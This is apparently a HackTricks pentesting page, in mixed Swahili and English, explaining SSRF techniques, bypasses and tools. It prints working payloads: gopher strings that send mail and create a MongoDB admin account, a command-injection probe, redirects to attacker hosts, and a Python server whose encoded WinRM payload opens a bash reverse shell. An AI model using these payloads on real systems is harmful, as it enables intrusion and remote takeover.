# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Uvunjaji wa **Server-side Request Forgery (SSRF)** hutokea wakati mshambuliaji anabadilisha **server-side application** ili ifanye **HTTP requests** kwa domain wanayoichagua. Uvunjaji huo unaweka server hatarini kwa maombi yoyote ya nje yanayoelekezwa na mshambuliaji.

## Kukamata SSRF

Jambo la kwanza unalopaswa kufanya ni kukamata muingiliano wa SSRF uliyosababishwa na wewe. Ili kukamata muingiliano wa **HTTP** au **DNS** unaweza kutumia zana kama:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Whitelisted Domains Bypass

Mara nyingi utagundua kwamba SSRF inafanya kazi tu kwenye **certain whitelisted domains** au URL. Katika ukurasa unaofuata kuna mkusanyiko wa mbinu za kujaribu ku-bypass whitelist hiyo:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via open redirect

Ikiwa server imehifadhiwa vizuri unaweza **bypass all the restrictions by exploiting an Open Redirect inside the web page**. Kwa sababu ukurasa wa wavuti utaweza kuruhusu **SSRF to the same domain** na labda uta **follow redirects**, unaweza kutumia **Open Redirect to make the server to access internal any resource**.\
Soma zaidi hapa: [https://portswigger.net/web-security/ssrf]

## Protocols

- **file://**
- The URL scheme `file://` inatajwa, ikielekeza moja kwa moja kwa `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- The DICT URL scheme inatumika kwa kupata definitions au word lists kupitia DICT protocol. Mfano unaonyesha URL iliyoundwa inayolenga neno maalum, database, na namba ya entry, pamoja na mfano wa skripti ya PHP inayoweza kutumiwa vibaya kuunganishwa na DICT server kwa credentials zinazotolewa na mshambuliaji: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Imetajwa kama protocol kwa ajili ya secure file transfer kupitia secure shell; mfano unaonyesha jinsi skripti ya PHP inaweza kutumika vibaya kuunganishwa na SFTP server hasidi: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol, inayofanya kazi juu ya UDP, imetajwa pamoja na mfano wa skripti ya PHP iliyoundwa kutuma ombi kwa TFTP server. Ombi la TFTP limefanywa kwa 'generic.com' kwenye port '12346' kwa faili 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Sehemu hii inashughulikia Lightweight Directory Access Protocol, ikisisitiza matumizi yake kwa kusimamia na kupata huduma za taarifa za directory zilizosambazwa kupitia mitandao ya IP. Interact with an LDAP server on localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Inafafanuliwa njia za kutumia udhaifu wa SSRF kuwasiliana na huduma za SMTP kwenye localhost, ikijumuisha hatua za kufichua majina ya domain ya ndani na hatua za uchunguzi zaidi kulingana na taarifa hizo.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Ikiwa SSRF inatekelezwa kwa kutumia **curl**, curl ina kipengele kinachoitwa [**URL globbing**](https://everything.curl.dev/cmdline/globbing) ambacho kinaweza kusaidia ku-bypass WAFs. Kwa mfano, katika hii [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) unaweza kupata mfano huu wa **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Uwezo wa itifaki ya Gopher kutaja IP, port, na bytes kwa mawasiliano na server unajadiliwa, pamoja na zana kama Gopherus na remote-method-guesser kwa kutengeneza payloads. Matumizi mawili tofauti yanaonyeshwa:

### Gopher://

Kutumia itifaki hii unaweza kutaja **IP, port and bytes** unayotaka server itumie **kutuma**. Kisha, kwa msingi unaweza kutumia SSRF ili **kuwasiliana na seva yoyote ya TCP** (lakini unahitaji kujua jinsi ya kuzungumza na huduma kwanza).\
Kwa bahati nzuri, unaweza kutumia [Gopherus](https://github.com/tarunkant/Gopherus) kutengeneza payloads kwa huduma kadhaa. Zaidi ya hayo, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) inaweza kutumika kutengeneza _gopher_ payloads kwa huduma za _Java RMI_.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Unganisha nyuma kwa 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Unda mtumiaji mwenye username=admin, password=admin123 na permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Nyingine

Programu za analytics kwenye servers mara nyingi hurekodi Referrer header ili kufuatilia incoming links, tabia ambayo bila kukusudia huweka applications wazi kwa Server-Side Request Forgery (SSRF) vulnerabilities. Hii ni kwa sababu programu kama hizo zinaweza kutembelea URLs za nje zilizotajwa kwenye Referrer header ili kuchambua yaliyomo kwenye tovuti ya referral. Ili kugundua udhaifu huo, inashauriwa kutumia Burp Suite plugin "**Collaborator Everywhere**", ikitumia jinsi zana za analytics zinavyochakata Referer header ili kubaini potential SSRF attack surfaces.

## SSRF kupitia data za SNI kutoka kwa certificate

Misconfiguration inayoweza kuruhusu muunganisho kwa backend yoyote kupitia usanidi rahisi inaonyeshwa kwa mfano wa usanidi wa Nginx:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
Katika usanidi huu, thamani kutoka kwenye Server Name Indication (SNI) inatumiwa moja kwa moja kama anwani ya backend. Usanidi huu unaonyesha udhaifu wa Server-Side Request Forgery (SSRF), ambao unaweza kutumiwa kwa kuweka tu anwani ya IP au jina la kikoa unalotaka katika sehemu ya SNI. Mfano wa kutumia udhaifu ili kulazimisha muunganisho kwa backend yoyote, kama `internal.host.com`, kwa kutumia amri ya `openssl` umeonyeshwa hapa chini:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

It might be worth trying a payload like: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Utengenezaji wa PDF

Ikiwa ukurasa wa wavuti unaunda moja kwa moja PDF kwa baadhi ya taarifa umeitoa, unaweza **kuingiza JS itakayotekelezwa na mjenzi wa PDF** mwenyewe (server) wakati wa kuunda PDF na utaweza kutumia SSRF. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## Kutoka SSRF hadi DoS

Tengeneza vikao kadhaa na jaribu kupakua mafaili mazito kwa kutumia SSRF kutoka vikao hivyo.

## SSRF PHP Functions

Angalia ukurasa ufuatao kwa ajili ya functions za PHP na hata za Wordpress zinazoweza kuwa hatari:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF: Rudisha kwa Gopher

Kwa baadhi ya exploit unaweza kuhitaji **kutuma response ya redirect** (inawezekana ili kutumia protocol tofauti kama gopher). Hapa kuna code tofauti za python za kujibu kwa redirect:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Proksi zilizopangwa vibaya kwa SSRF

Mbinu [**kutoka kwenye chapisho hiki**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Msimbo dhaifu wa proxy wa Flask</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask inaruhusu kutumia **`@`** kama alama ya mwanzo, ambayo inaruhusu kufanya **jina la mwenyeji la awali kuwa jina la mtumiaji** na kuingiza jipya. Ombi la shambulio:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Msimbo dhaifu:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Ilibainika kuwa inawezekana kuanza **start the path** ya request kwa kutumia herufi **`;`**, ambayo inawezesha kisha kutumia **`@`** na kuingiza host mpya ili kufikiwa. Attack request:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP Built-in Web Server <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Msimbo wa PHP wenye udhaifu</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP inaruhusu matumizi ya **char `*` kabla ya slash katika path** ya URL, hata hivyo, ina vikwazo vingine kama vile inaweza kutumika tu kwa root pathname `/` na kwamba dots `.` haziruhusiwi kabla ya slash ya kwanza, hivyo inahitajika kutumia anwani ya IP iliyosimbwa kwa hex bila nukta, kwa mfano:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

If you are having **problems** to **exfiltrate content from a local IP** because of **CORS/SOP**, **DNS Rebidding** can be used to bypass that limitation:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) ni zana ya kufanya [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) attacks. Inajumuisha vipengele vinavyohitajika kurudisha IP address ya jina la DNS la attacker server kwa IP address ya target machine na kuhudumia attack payloads ili exploit software zilizo vulnerable kwenye target machine.

Angalia pia server inayoendesha hadharani katika [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requirements:

- **SSRF**
- **Outbound TLS sessions**
- **Mambo kwenye local ports**

Attack:

1. Muombe user/bot a-access domain inayodhibitiwa na attacker
2. TTL ya **DNS** ni **0** sec (hivyo victim atatafuta tena IP ya domain hivi karibuni)
3. Muunganisho wa **TLS** unaundwa kati ya victim na domain ya attacker. Attacker anaingiza **payload ndani** ya **Session ID** au **Session Ticket**.
4. Domain itaanza loop isiyo na mwisho ya redirects dhidi yake mwenyewe. Lengo ni kumfanya user/bot a-access domain hadi itafanya **tena** request ya **DNS** kwa domain.
5. Katika request ya **DNS** sasa anapewa anwani ya **private IP** (kwa mfano 127.0.0.1)
6. User/bot atajaribu kuanzisha tena muunganisho wa **TLS** na kwa kufanya hivyo itatuma **Session ID/Ticket ID** (ambapo payload ya attacker ilikuwa imehifadhiwa). Hongera, umefanikisha kumfanya **user/bot ajishambulia mwenyewe**.

Kumbuka kwamba wakati wa shambulio hili, ikiwa unataka kushambulia localhost:11211 (_memcache_) unahitaji kumfanya victim aanzishe muunganisho wa awali na www.attacker.com:11211 (the **port must always be the same**).\
To **perform this attack you can use the tool**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
For **more information** take a look to the talk where this attack is explained: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Tofauti kati ya blind SSRF na isiyo blind ni kwamba katika blind hutaona response ya SSRF request. Hivyo, ni ngumu zaidi ku-exploit kwa sababu utaweza ku-exploit tu vulnerabilities zinazojulikana vizuri.

### Time based SSRF

Kwa kukagua muda wa responses kutoka server inaweza kuwa inawezekana kujua kama resource ipo au la (pengine inachukua muda zaidi kufikia resource iliyopo kuliko ile isiyoipo)

### From blid to full abusing status codes

Kulingana na [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), baadhi ya blind SSRF zinaweza kutokea kwa sababu hata kama URL lengwa inarudisha 200 status code (kama AWS metadata), data hii haifomatiwi ipasavyo na hivyo app inaweza kukataa kuionesha.

Hata hivyo, imegundulika kwamba kutuma baadhi ya redirect responses kutoka 305 hadi 309 katika SSRF kunaweza kufanya application ifuate redirect hizi wakati ikingia katika error mode ambayo haitacheki tena muundo wa data na inaweza tu kuichapisha.

The python server used to exploit this is the following:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Hatua:**
- Kwanza 302 inasababisha programu kuanza kufuata.
- Kisha inapokea 305 → 306 → 307 → 308 → 309 → 310.
- Baada ya msimbo wa tano wa kushangaza, PoC hatimaye inarudisha 302 → 169.254.169.254 → 200 OK.

**Nini kinatokea ndani ya lengo:**
- libcurl yenyewe inafuata 305–310; inabadilisha msimbo usiojulikana kuwa “follow.”
- Baada ya redirect zisizo za kawaida N (≥ 5 hapa), wrapper ya programu inamua “something is off” na inabadilisha hadi mode ya error iliyokusudiwa kwa debugging.
- Katika mode hiyo inafanya dump ya mnyororo mzima wa redirect pamoja na body ya mwisho ikirudishwa kwa muomba wa nje.
- Matokeo: attacker anaona kila header + metadata JSON, lengo limefikiwa.

Note kwamba hili ni jambo la kuvutia kwa leak status codes ambazo haukuwezaka leak hapo awali (kama 200). Hata hivyo, ikiwa kwa njia fulani unaweza pia kuchagua status code ya response (fikiri unaweza kuamua kwamba AWS metadata inarejea na status code 500), **huenda kuna baadhi ya status codes ambazo moja kwa moja zinaweza leak content ya response.**

### HTML-to-PDF renderers kama blind SSRF gadgets

Maktaba kama **TCPDF** (na wrappers kama **spipu/html2pdf**) zitachukua moja kwa moja URL yoyote iliyopo kwenye attacker-controlled HTML wakati zinapotengeneza PDF. Kila `<img>` au `<link rel="stylesheet">` attribute hutatuliwa upande wa server kupitia cURL, `getimagesize()`, au `file_get_contents()`, hivyo unaweza kusababisha mchakato wa PDF kuchunguza hosts za ndani ingawa hakuna HTTP response inayojitokeza kwako.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 inafanya jaribio kadhaa za upokeaji kwa kila rasilimali ya `<img>`, hivyo payload moja inaweza kuzalisha requests nyingi (inayosaidia kwa timing-based port scans).
- html2pdf inaiga tabia ya TCPDF kwa `<img>` na inaongeza kuchukua CSS ndani ya `Css::extractStyle()`, ambayo huwaita tu `file_get_contents($href)` baada ya ukaguzi mdogo wa scheme. Itumie kugonga loopback services, RFC1918 ranges, au cloud metadata endpoints.
- Combine primitive hii ya SSRF na [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) ili leak majibu ya ndani ya HTTP na faili za ndani zilizochorwa ndani ya PDF.

Wataalamu wa usalama wanapaswa kuondoa external URLs kabla ya rendering au kutenganisha renderer katika network sandbox; hadi wakati huo, treat PDF generators kama blind SSRF proxies.

## Cloud SSRF Exploitation

Iwapo utapata udhaifu wa SSRF kwenye mashine inayofanya kazi ndani ya mazingira ya cloud unaweza kupata taarifa za kuvutia kuhusu mazingira ya cloud na hata credentials:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF Vulnerable Platforms

Majukwaa kadhaa yanayojulikana yana au yamekuwa na udhaifu wa SSRF, angalia yao hapa:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Tools

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool ya kugundua na kutekeza SSRF vulnerabilities

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Zana hii inazalisha Gopher payloads kwa:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ ni skana ya udhaifu wa _Java RMI_ inayounga mkono operesheni za shambulio kwa udhaifu wa kawaida wa _Java RMI_. Operesheni nyingi zinazopatikana zinaunga mkono chaguo la `--ssrf`, ili kutengeneza payload ya _SSRF_ kwa operesheni iliyohitajika. Pamoja na chaguo la `--gopher`, payloads za _gopher_ tayari za matumizi zinaweza kutengenezwa moja kwa moja.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy ni multi-threaded HTTP proxy server iliyoundwa kutunnel trafiki ya HTTP ya client kupitia HTTP servers zilizo vunerable kwa Server-Side Request Forgery (SSRF).

### To practice


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## References

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
